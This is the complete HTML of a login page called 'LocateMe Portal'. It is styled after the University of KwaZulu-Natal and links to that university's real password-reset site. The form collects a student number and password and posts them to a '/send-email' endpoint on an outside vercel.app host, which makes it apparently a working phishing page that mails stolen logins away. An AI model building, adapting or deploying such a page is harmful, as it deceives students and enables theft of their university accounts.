<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LocateMe Portal</title>
    <link rel="stylesheet" href="ukzn.css">
</head>
<body>
    <div class="limiter">
        <div class="container-login100">
            <div class="wrap-login100">
                <form action="https://locateme-portal-ukzn.vercel.app/send-email" method="POST">
                    <span class="login100-form-title p-b-26">LocateMe Portal</span>
                    <div>
                        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhW3rgCMugc4tAXVPRQKWvbypsNsPRpAWgg79lEg4H86LjhNXAcOQqiveiTwyQUmZVhGLNJcVHWgfIIaNO4jYvt0MI35cLZFB__Pj9uRpRcn7y2oglUEz8Mt0K_2oxl7QhveUu7N4mr1BzKAbUjuxhjaCeTkExrQDhzIfvV7izn-jGoOBo6bGvV0zKM6zI" alt="" style="width: 90%; height: 50%;">
                    </div>
                    <div class="wrap-input100 validate-input" data-validate="Input your student number">
                        <input name="username" type="text" id="username" class="input100" required />
                        <span class="focus-input100" data-placeholder="Username"></span>
                    </div>
                    <div class="wrap-input100 validate-input" data-validate="Enter password">
                        <span class="btn-show-pass">
                            <i class="zmdi zmdi-eye iconify"></i>
                        </span>
                        <input name="password" type="password" id="password" class="input100" required />
                        <span class="focus-input100" data-placeholder="Password"></span>
                    </div>
                    <div class="container-login100-form-btn">
                        <div class="wrap-login100-form-btn">
                            <div class="login100-form-bgbtn"></div>
                            <button type="submit" class="login100-form-btn">Login</button>
                        </div>
                    </div>
                    <div class="text-center p-t-115">
                        <br>
                        <center>
                            <span class="txt1">Forgot Password?</span>
                            <a class="txt2" href="https://passwordchange.ukzn.ac.za" target="_blank">Reset</a>
                        </center>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
